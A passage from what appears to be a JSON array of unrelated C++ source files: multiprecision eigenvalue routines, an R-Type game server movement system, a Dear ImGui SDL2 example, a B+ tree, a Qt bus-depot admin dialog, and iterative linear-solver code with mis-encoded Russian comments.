Af;\n}\n\nDynamics set_dynamics(mpreal base, int n, int digits, int stagger) {\n    // (1) create indicator values. set proper bounds on exponents\n    int start = static_cast<int>(std::floor(-digits / 2.0));\n    int end = static_cast<int>(std::ceil(digits / 2.0)-stagger);\n    std::vector<mpreal> indicators;\n\n    for (int i = start; i < end; i+=stagger+1) {\n        indicators.push_back(pow(base, i));\n    }\n\n    // reverse the vector\n    std::reverse(indicators.begin(), indicators.end());\n    \n    // (2) create n 'random' real values. -needs- to have enough precision here\n    std::vector<mpreal> values;\n    mpreal inv_exp = -std::floor(digits / 2.0);  // Calculate -Floor[digits / 2]\n    for (int i = 1; i <= n; ++i) {\n        mpreal m_i = i;  // Convert i to mpreal\n        mpreal term = m_i + 1/m_i + pow(m_i, inv_exp);\n        values.push_back(term);\n    }\n    // shuffle the random real values\n    std::random_device rd;\n    std::mt19937 g(rd());\n    std::shuffle(values.begin(), values.end(), g);\n    \n    Dynamics dynamics;\n    dynamics.real_values = values;\n    dynamics.indicator_values = indicators;\n    return dynamics;\n}\n\n\nExtractionParams set_extraction_params(const mpreal& base, int digits) {\n    ExtractionParams params;\n    mpreal midpoint_value = mpfr::floor(base / 2) - 1;\n    params.midpoint = 0;\n\n    for (int i = -floor((float)digits / 2); i < ceil((float)digits / 2); i++) {\n        params.midpoint += midpoint_value * mpfr::pow(base, i);\n    }\n\n    // Chain casting is safe for these midpoint values which will \n    // almost never exceed 100 or so\n    params.midpoint_value = (int)(long int)(midpoint_value);\n    return params;\n}\n\n// Function to convert digits in an arbitrary base to bits\nint digits_to_bits(int digits, int base) {\n    double log2_base = std::log2(base);\n    return static_cast<int>(std::ceil(digits * log2_base));\n}\n\n//real-sort method\nbool compare_real(const mpcomplex &a, const mpcomplex &b) {\n    return a.real() < b.real();\n}\n\n//computing numeric eigenvalues with Cgeev, and sorting result\nmpcomplex* sorted_eig(mpcomplex* a, mpcomplex* w, int n, int batch_index) {\n    mpcomplex *vl = new mpcomplex[n * n];\n    mpcomplex *vr = new mpcomplex[n * n];\n    mplapackint lwork = 4 * n;\n    mpcomplex *work = new mpcomplex[lwork];    \n    mpreal *rwork = new mpreal[lwork];\n    mplapackint info;\n    \n    Cgeev(\"N\", \"N\", n, a, n, w, vl, n, vr, n, work, lwork, rwork, info);\n    std::sort(w, w + n, compare_real);\n    \n    delete[] rwork;\n    delete[] work;\n    delete[] vr;\n    delete[] vl;\n    \n    //once eigenvalues are computed, complex matrix no longer needed\n    delete[] a;\n    \n    return w;\n}\n\nint filler_digits(const mpreal& e, int digits, const mpreal& base) {\n    if (mpfr::abs(e) / mpfr::pow(base, mpfr::ceil(digits / 2) - 1) >= 1) {\n        return 0;\n    }\n    int j = 2;\n ",
    "/*\n** EPITECH PROJECT, 2024\n** R-Type Server\n** File description:\n** MoveSystemDown\n*/\n\n#include \"MoveSystemDown.hpp\"\n\nMoveSystemDown::MoveSystemDown() :\n    ASystem(\"MovementUpSystem\")\n{\n}\n\nstd::function<void(ECS::Registry& reg, int idxPacketEntities)> MoveSystemDown::getFunction()\n{\n    return [this](ECS::Registry& reg, int idxPacketEntities) {\n        updateDownPosition(reg, idxPacketEntities);\n    };\n}\n\nvoid MoveSystemDown::updateDownPosition(ECS::Registry& entityManager, int idxPacketEntities)\n{\n    try {\n        ECS::SparseArray<IComponent> PositionComponentArray = entityManager.get_components<IComponent>(\"Position2DComponent\");\n        ECS::SparseArray<IComponent> SpeedComponentArray = entityManager.get_components<IComponent>(\"SpeedComponent\");\n\n        if (PositionComponentArray.size() <= idxPacketEntities || SpeedComponentArray.size() <= idxPacketEntities)\n            return;\n\n        Position2DComponent* position = dynamic_cast<Position2DComponent*>(PositionComponentArray[idxPacketEntities].get());\n        SpeedComponent* speed = dynamic_cast<SpeedComponent*>(SpeedComponentArray[idxPacketEntities].get());\n\n        position->y += speed->speedY;\n\n        entityManager.messageType = 0x01;\n        entityManager.payload.clear();\n\n        std::string componentType = \"Position2DComponent\";\n        entityManager.payload.push_back(static_cast<uint8_t>(componentType.size()));\n        entityManager.payload.insert(entityManager.payload.end(), componentType.begin(), componentType.end());\n\n\n        entityManager.payload.push_back(static_cast<uint8_t>(idxPacketEntities >> 24) & 0xFF);\n        entityManager.payload.push_back(static_cast<uint8_t>((idxPacketEntities >> 16) & 0xFF));\n        entityManager.payload.push_back(static_cast<uint8_t>((idxPacketEntities >> 8) & 0xFF));\n        entityManager.payload.push_back(static_cast<uint8_t>((idxPacketEntities) & 0xFF));\n\n        float x = position->x;\n        uint8_t* xBytes = reinterpret_cast<uint8_t*>(&x);\n        entityManager.payload.insert(entityManager.payload.end(), xBytes, xBytes + sizeof(float));\n\n        float y = position->y;\n        uint8_t* yBytes = reinterpret_cast<uint8_t*>(&y);\n        entityManager.payload.insert(entityManager.payload.end(), yBytes, yBytes + sizeof(float));\n    } catch(const std::exception& e) {\n        std::cerr << \"Exception: \" << e.what() << std::endl;\n    }\n}\n\nextern \"C\" ISystem* loadSystemInstance()\n{\n    return new MoveSystemDown();\n}\n",
    "// Dear ImGui: standalone example application for SDL2 + OpenGL\n// (SDL is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_opengl3.h\"\n#include <stdio.h>\n#include <SDL.h>\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n#include <SDL_opengles2.h>\n#else\n#include <SDL_opengl.h>\n#endif\n\n// This example can also compile and run with Emscripten! See 'Makefile.emscripten' for details.\n#ifdef __EMSCRIPTEN__\n#include \"../libs/emscripten/emscripten_mainloop_stub.h\"\n#endif\n\n// Main code\nint main(int, char**)\n{\n    // Setup SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMECONTROLLER) != 0)\n    {\n        printf(\"Error: %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    // Decide GL+GLSL versions\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n    // GL ES 2.0 + GLSL 100\n    const char* glsl_version = \"#version 100\";\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, 0);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_ES);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 2);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 0);\n#elif defined(__APPLE__)\n    // GL 3.2 Core + GLSL 150\n    const char* glsl_version = \"#version 150\";\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, SDL_GL_CONTEXT_FORWARD_COMPATIBLE_FLAG); // Always required on Mac\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_CORE);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 3);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 2);\n#else\n    // GL 3.0 + GLSL 130\n    const char* glsl_version = \"#version 130\";\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, 0);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_CORE);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 3);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 0);\n#endif\n\n    // From 2.0.18: Enable native IME.\n#ifdef SDL_HINT_IME_SHOW_UI\n    SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");\n#endif\n\n    // Create window with graphics context\n    SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);\n    SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);\n    SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);\n    SDL_WindowFlags window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);\n    SDL_Window* window = SDL_CreateWindow(\"Dear ImGui SDL2+OpenGL3 example\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, window_flags);\n    if (window == nullptr)\n    {\n        printf(\"Error: SDL_CreateWindow(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    SDL_GLContext gl_context = SDL_GL_CreateContext(window);\n    SDL_GL_MakeCurrent(window, gl_context);\n    SDL_GL_SetSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplSDL2_InitForOpenGL(window, gl_context);\n    ImGui_ImplOpenGL3_Init(glsl_version);\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    // - Our Emscripten build process allows embedding fonts to be accessible at runtime from the \"fonts/\" folder. See Makefile.emscripten for details.\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/DroidSans.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFil",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\ntemplate <typename T>\r\nvoid operator += (vector<T>& a, vector<T>& b){\r\n    for(auto x : b) a.push_back(x);\r\n    b.clear();\r\n}\r\n\r\nint order, order_leaf;\r\nclass Node{\r\npublic:\r\n    vector<int> key;\r\n    vector<Node*> children;\r\n    Node* next;\r\n\r\n    Node* insert(int val){\r\n        if(children.empty()){\r\n            auto it = lower_bound(key.begin(), key.end(), val);\r\n            if(it != key.end() && *it == val) return nullptr;\r\n            key.insert(it, val);\r\n            if(key.size() > order_leaf){\r\n                int j = order_leaf / 2;\r\n                next = new Node();\r\n                for(int i = j + 1; i < key.size(); i++) next -> key.push_back(key[i]);\r\n                key.resize(j + 1);\r\n            }\r\n            return next;\r\n        }\r\n        auto child = children[lower_bound(key.begin(), key.end(), val) - key.begin()];\r\n        auto new_child = child -> insert(val);\r\n        if(new_child){\r\n            int x = child -> key.back();\r\n            auto it = lower_bound(key.begin(), key.end(), x);\r\n            if(it == key.end() || *it != x) key.insert(it, x);\r\n            if(!child -> children.empty()) child -> key.pop_back();\r\n            x = new_child -> key.back();\r\n            int i = lower_bound(key.begin(), key.end(), x) - key.begin();\r\n            children.insert(children.begin() + i, new_child);\r\n        }\r\n        if(key.size() >= order){\r\n            int j = (order - 1) / 2;\r\n            auto sib = new Node();\r\n            sib -> children.push_back(children[j + 1]);\r\n            for(int i = j + 1; i < key.size(); i++) sib -> key.push_back(key[i]), sib -> children.push_back(children[i + 1]);\r\n            key.resize(j + 1);\r\n            children.resize(j + 1);\r\n            return sib;\r\n        }\r\n        return nullptr;\r\n    }\r\n\r\n    void Delete(int val){\r\n        if(children.empty()){\r\n            auto it = find(key.begin(), key.end(), val);\r\n            if(it != key.end()) key.erase(it);\r\n            return;\r\n        }\r\n        int id = lower_bound(key.begin(), key.end(), val) - key.begin();\r\n        int left = id - 1, right = id + 1;\r\n        children[id] -> Delete(val);\r\n        if(children[id] -> children.empty()){\r\n            if(children[id] -> key.size() >= (order_leaf + 1) / 2) return;\r\n            if(id > 0 && children[left] -> key.size() > (order_leaf + 1) / 2){\r\n                children[id] -> key.insert(children[id] -> key.begin(), children[left] -> key.back());\r\n                children[left] -> key.pop_back();\r\n                key[left] = children[left] -> key.back();\r\n            }\r\n            else if(id < key.size() && children[right] -> key.size() > (order_leaf + 1) / 2){\r\n                children[id] -> key.push_back(children[right] -> key[0]);\r\n                children[right] -> key.erase(children[right] -> key.begin());\r\n                key[id] = children[id] -> key.back();\r\n            }\r\n            else{\r\n                if(id > 0){\r\n                    children[left] -> key += children[id] -> key;\r\n                    children[left] -> next = children[id] -> next;\r\n                    children[id] -> next = nullptr;\r\n                    children.erase(children.begin() + id);\r\n                    key.erase(key.begin() + left);\r\n                }\r\n                else{\r\n                    children[id] -> key += children[right] -> key;\r\n                    children[id] -> next = children[right] -> next;\r\n                    children[right] -> next = nullptr;\r\n                    children.erase(children.begin() + right);\r\n                    key.erase(key.begin() + id);\r\n                }\r\n            }\r\n            return;\r\n        }\r\n        if(children[id] -> children.size() >= (order + 1) / 2) return;\r\n        if(id > 0 && children[left] -> children.size() > (order + 1) / 2){\r\n            children[id] -> key.insert(children[id] -> key.begin(), key[left]);\r\n            children[id] -> children.insert(children[id] -> children.begin(), children[left] -> children.back());\r\n            key[left] = children[left] -> key.back();\r\n            children[left] -> key.pop_back();\r\n            children[left] -> children.pop_back();\r\n        }\r\n        else if(id < key.size() && children[right] -> children.size() > (order + 1) / 2){\r\n            children[id] -> key.push_back(key[id]);\r\n            children[id] -> children.push_back(children[right]);\r\n            key[id] = children[right] -> key[0];\r\n            children[right] -> key.erase(children[right] -> key.begin());\r\n            children[right] -> children.erase(children[right] -> children.begin());\r\n        }\r\n        else{\r\n            if(id > 0){\r\n                children[left] -> key.push_back(key[left]);\r\n                children[left] -> key += children[id] -> key;\r\n                children[left] -> children += children[id] -> children;\r\n                children.erase(children.begin() + id);\r\n                key.erase(key.begin() + left);\r\n            }\r\n         ",
    "#include \"adddataadmin.h\"\r\n#include \"ui_adddataadmin.h\"\r\n\r\naddDataAdmin::addDataAdmin(QWidget *parent) : // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n    QDialog(parent),\r\n    ui(new Ui::addDataAdmin)\r\n{\r\n    ui->setupUi(this);\r\n}\r\n\r\naddDataAdmin::~addDataAdmin() // \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid addDataAdmin::loadInterface(int index) // \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430\r\n{\r\n    currentIndex = index;\r\n    switch (currentIndex) {\r\n    case 0:{addBus();break;}\r\n    case 1:{addDriver();break;}\r\n    case 2:{addDepot();break;}\r\n    case 3:{addRoute();break;}\r\n    case 4:{addStop();break;}\r\n    case 5:{addBusType();break;}}\r\n}\r\n\r\nvoid addDataAdmin::addDriver() // \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044f\r\n{\r\n    setWindowTitle(\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044f\");\r\n    createLineEdit(\"name_driver\",10,10,300,50,\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0424\u0418\u041e\");\r\n}\r\n\r\nvoid addDataAdmin::addDepot() // \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0434\u0435\u043f\u043e\r\n{\r\n    setWindowTitle(\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0434\u0435\u043f\u043e\");\r\n    createLineEdit(\"name_depot\",10,10,300,50,\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u0435 \u0434\u0435\u043f\u043e\");\r\n}\r\n\r\nvoid addDataAdmin::addBusType() // \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0442\u0438\u043f \u0430\u0432\u0442\u043e\u0431\u0443\u0441\u0430\r\n{\r\n    setWindowTitle(\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0442\u0438\u043f \u0430\u0432\u0442\u043e\u0431\u0443\u0441\u0430\");\r\n    createLineEdit(\"name_Bus_Type\",10,10,300,50,\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u0438\u043f\u0430 \u0430\u0432\u0442\u043e\u0431\u0443\u0441\u0430\");\r\n}\r\n\r\nvoid addDataAdmin::addStop() // \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443\r\n{\r\n    setWindowTitle(\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443\");\r\n    createLineEdit(\"name_Stop\",10,10,300,50,\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438\");\r\n\r\n    createDoubleSpinBox(\"lat\",10,70,100,50,-90,90);\r\n    createDoubleSpinBox(\"lon\",10,130,100,50,-90,90);\r\n\r\n    createLabel(\"lat\",120,70,100,50,\"\u0423\u043a\u0430\u0436\u0438\u0442\u0435 \u0448\u0438\u0440\u043e\u0442\u0443\");\r\n    createLabel(\"lon\",120,130,100,50,\"\u0423\u043a\u0430\u0436\u0438\u0442\u0435 \u0434\u043e\u043b\u0433\u043e\u0442\u0443\");\r\n}\r\n\r\nvoid addDataAdmin::addBus() // \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0430\u0432\u0442\u043e\u0431\u0443\u0441\r\n{\r\n    setWindowTitle(\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0430\u0432\u0442\u043e\u0431\u0443\u0441\");\r\n\r\n    createComboBox(\"driver\",10,10,200,40,additionalData[0]);\r\n    createLabel(\"driver\",220,10,100,40,\"\u0412\u043e\u0434\u0438\u0442\u0435\u043b\u044c\");\r\n\r\n    createComboBox(\"route\",10,60,200,40,additionalData[1]);\r\n    createLabel(\"route\",220,60,100,40,\"\u041c\u0430\u0440\u0448\u0440\u0443\u0442\");\r\n\r\n    createComboBox(\"depot\",10,110,200,40,additionalData[2]);\r\n    createLabel(\"depot\",220,110,100,40,\"\u0414\u0435\u043f\u043e\");\r\n\r\n    createComboBox(\"type\",10,160,200,40,additionalData[3]);\r\n    createLabel(\"type\",220,160,100,40,\"\u0422\u0438\u043f\");\r\n\r\n    createLineEdit(\"regnum\",10,250,200,40,\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u043e\u043d\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440\");\r\n\r\n    this->findChild<QLineEdit*>(\"regnum\")->setInputMask(\"AA999A\");\r\n    createCheckBox(\"online\",320,10,70,20,\"\u041d\u0430 \u043b\u0438\u043d\u0438\u0438\");\r\n\r\n    createSpinBox(\"year\",320,80,60,40,1970,2024);\r\n    createLabel(\"year\",320,60,200,20,\"\u041f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0441\u0442\u0432\u043e\");\r\n\r\n    createSpinBox(\"pos\",320,160,60,40,1,100);\r\n    createLabel(\"pos\",320,140,200,20,\"\u041f\u043e\u0437\u0438\u0446\u0438\u044f\");\r\n}\r\n\r\nvoid addDataAdmin::addRoute() // \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043c\u0430\u0440\u0448\u0440\u0443\u0442\r\n{\r\n    setWindowTitle(\"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043c\u0430\u0440\u0448\u0440\u0443\u0442\");\r\n    createLineEdit(\"nameRoute\",10,250,200,40,\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043c\u0430\u0440\u0448\u0440\u0443\u0442\u0430\");\r\n\r\n    createTimeEdit(\"first\",10,10,100,40);\r\n    createLabel(\"first\",120,10,100,40,\"\u0412\u0440\u0435\u043c\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0432\u043e\u0433\u043e\");\r\n\r\n    createTimeEdit(\"last\",10,60,100,40);\r\n    createLabel(\"last\",120,60,100,40,\"\u0412\u0440\u0435\u043c\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e\");\r\n\r\n    createTimeEdit(\"interval\",10,110,100,40);\r\n    createLabel(\"interval\",120,110,100,40,\"\u0418\u043d\u0442\u0435\u0440\u0432\u0430\u043b\");\r\n\r\n    createTimeEdit(\"overall\",10,160,100,40);\r\n    createLabel(\"overall\",120,160,100,40,\"\u041e\u0431\u0449\u0435\u0435 \u0432\u0440\u0435\u043c\u044f\");\r\n}\r\n\r\nvoid addDataAdmin::setAdditionalData(QList<QMap<int, QString>> data) // \u0421\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435 \u0434\u043e\u043f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438\r\n{\r\n    additionalData = data;\r\n}\r\n\r\nvoid addDataAdmin::createLineEdit(QString objectName, int x, int y, int w, int h, QString placeholderText) // \u0421\u043e\u0437\u0434\u0430\u0442\u044c LineEdit\r\n{\r\n    QLineEdit* temp = new QLineEdit(this);\r\n    setWidgetParams(temp,objectName,x,y,w,h);\r\n    temp->setPlaceholderText(placeholderText);\r\n}\r\n\r\nvoid addDataAdmin::createDoubleSpinBox(QString objectName, int x, int y, int w, int h, double min, double max) // \u0441\u043e\u0437\u0434\u0430\u0442\u044c DbouleSPinxBox\r\n{\r\n    QDoubleSpinBox* temp = new QDoubleSpinBox(this);\r\n    setWidgetParams(temp,objectName,x,y,w,h);\r\n    temp->setMinimum(min);\r\n    temp->setMaximum(max);\r\n    temp->setDecimals(5);\r\n    temp->setSingleStep(0.001);\r\n}\r\n\r\nvoid addDataAdmin::createLabel(QString objectName, int x, int y, int w, int h, QString text) // \u0421\u043e\u0437\u0434\u0430\u0442\u044c label\r\n{\r\n    QLabel* temp = new QLabel(this);\r\n    setWidgetParams(temp,objectName,x,y,w,h);\r\n    temp->setText(text);\r\n}\r\n\r\nvoid addDataAdmin::createComboBox(QString objectName, int x, int y, int w, int h, QMap<int, QString> data) // \u0421\u043e\u0437\u0434\u0430\u0442\u044c comboBox\r\n{\r\n    QComboBox* temp = new QComboBox(this);\r\n    setWidgetParams(temp,objectName,x,y,w,h);\r\n    for (int i = 0; i < data.count(); i++)\r\n        temp->addItem(data[data.keys()[i]]);\r\n}\r\n\r\nvoid addDataAdmin::createCheckBox(QString objectName, int x, int y, int w, int h, QString text) // \u0421\u043e\u0437\u0434\u0430\u0442\u044c checkbox\r\n{\r\n    QCheckBox* temp = new QCheckBox(this);\r\n    setWidgetParams(temp,objectName,x,y,w,h);\r\n    temp->setText(text);\r\n}\r\n\r\nvoid addDataAdmin::createSpinBox(QString objectName, int x, int y, int w, int h, int min, int max) // \u0421\u043e\u0437\u0434\u0430\u0438\u044c Spinbox\r\n{\r\n    QSpinBox* temp = new QSpinBox(this);\r\n    setWidgetParams(temp,objectName,x,y,w,h);\r\n    temp->setMinimum(min);\r\n    temp->setMaximum(max);\r\n}\r\n\r\nvoid addDataAdmin::createTimeEdit(QString objectName",
    "// ConsoleApplication17.cpp : \u00dd\u00f2\u00ee\u00f2 \u00f4\u00e0\u00e9\u00eb \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e8\u00f2 \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00fe \"main\". \u00c7\u00e4\u00e5\u00f1\u00fc \u00ed\u00e0\u00f7\u00e8\u00ed\u00e0\u00e5\u00f2\u00f1\u00ff \u00e8 \u00e7\u00e0\u00ea\u00e0\u00ed\u00f7\u00e8\u00e2\u00e0\u00e5\u00f2\u00f1\u00ff \u00e2\u00fb\u00ef\u00ee\u00eb\u00ed\u00e5\u00ed\u00e8\u00e5 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb.\r\n#include <iostream>\r\nusing namespace std;\r\n#include <vector>\r\n#include<cmath>\r\n#include <fstream>\r\n#include<string>\r\ndouble eps = 0.00000001;\r\n\r\n\r\ndouble norm0(int n, vector<double> x) {\r\n\tdouble ans = 0;\r\n\tfor (int i = 0; i < n; i++) {\r\n\t\tans += (x[i] * x[i]);\r\n\t}\r\n\treturn sqrt(ans);\r\n}\r\n\r\ntemplate<typename t>\r\nt norm01(int n, vector<t> x, vector<t> x1) {\r\n\tt ans = 0;\r\n\tfor (int i = 0; i < n; i++) {\r\n\t\tans += ((x[i] - x1[i]) * (x[i] - x1[i]));\r\n\t}\r\n\treturn sqrt(ans);\r\n}\r\n//template<typename t>\r\n//vector<t> step(int n, vector<vector<t>>a, vector<t>b, vector<t>& x, int ceo) {\r\n//\tvector<t>zero(n, 0);\r\n//\tvector<t>temp = x;\r\n//\tswitch (ceo) {\r\n//\tcase 1:\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx[i] = 1 / tay * b[i] / (1 / tay * a[i][i] + 1);\r\n//\t\t}\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tif (i != j) {\r\n//\t\t\t\t\tx[i] += (1 / tay * a[i][j] * temp[j]) / (-1 / tay * a[i][i] + 1);\r\n//\t\t\t\t}\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\treturn x;\r\n//\tcase 2:\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx[i] = b[i] / a[i][i];\r\n//\t\t}\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tif (i != j) {\r\n//\t\t\t\t\tx[i] = x[i] - temp[j] * (a[i][j] / a[i][i]);\r\n//\t\t\t\t}\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\treturn x;\r\n//\tcase 3:\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx[i] = b[i] / a[i][i];\r\n//\t\t}\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tif (j < i) {\r\n//\t\t\t\t\tx[i] = x[i] - x[j] * a[i][j] / a[i][i];\r\n//\t\t\t\t}\r\n//\t\t\t\telse if (j != i) {\r\n//\t\t\t\t\tx[i] = x[i] - temp[j] * a[i][j] / a[i][i];\r\n//\t\t\t\t}\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\treturn x;\r\n//\tcase 4:\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx[i] = w * b[i] / a[i][i];\r\n//\t\t}\r\n//\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tif (j < i) {\r\n//\t\t\t\t\tx[i] = x[i] - w * x[j] * a[i][j] / a[i][i];\r\n//\t\t\t\t}\r\n//\t\t\t\telse if (j != i) {\r\n//\t\t\t\t\tx[i] = x[i] - w * temp[j] * a[i][j] / a[i][i];\r\n//\t\t\t\t}\r\n//\t\t\t\telse {\r\n//\t\t\t\t\tx[i] = x[i] + (1 - w) * temp[j];\r\n//\t\t\t\t}\r\n//\t\t\t}\r\n//\t\t}\r\n//\t\treturn x;\r\n//\t}\r\n//}\r\n//template<typename t>\r\n//t universalnorm(int n, vector<vector<t>>a, vector<t>b, int ceo, double tay, double w) {\r\n//\tvector<vector<t>> e;\r\n//\tvector<t> x(n, 0.0);\r\n//\tvector<t>z(n, 0);\r\n//\t//vector<t> b(n, 0.0);\r\n//\tt sum = 0.0;\r\n//\tfor (int i = 0; i < n; i++) {\r\n//\t\tx[i] = 1.0;\r\n//\t\te.push_back(x);\r\n//\t\tx[i] = 0.0;\r\n//\t}\r\n//\tvector<t>c(n, 0);\r\n//\tdouble max = 0;\r\n//\tvector<t>nor(n, 0);\r\n//\tswitch (ceo) {\r\n//\tcase 1://\u00ef\u00f0\u00ee\u00f1\u00f2\u00ee\u00e9 \u00e8\u00f2\u00e5\u00f0\u00e0\u00f6\u00e8\u00e8\r\n//\t\tfor (int i = 0; i < n; i++) {\r\n//\t\t\tx = e[i];\r\n//\t\t\tc = step(n, a, z, x, 1);\r\n//\t\t\tfor (int j = 0; j < n; j++) {\r\n//\t\t\t\tnor[j] += 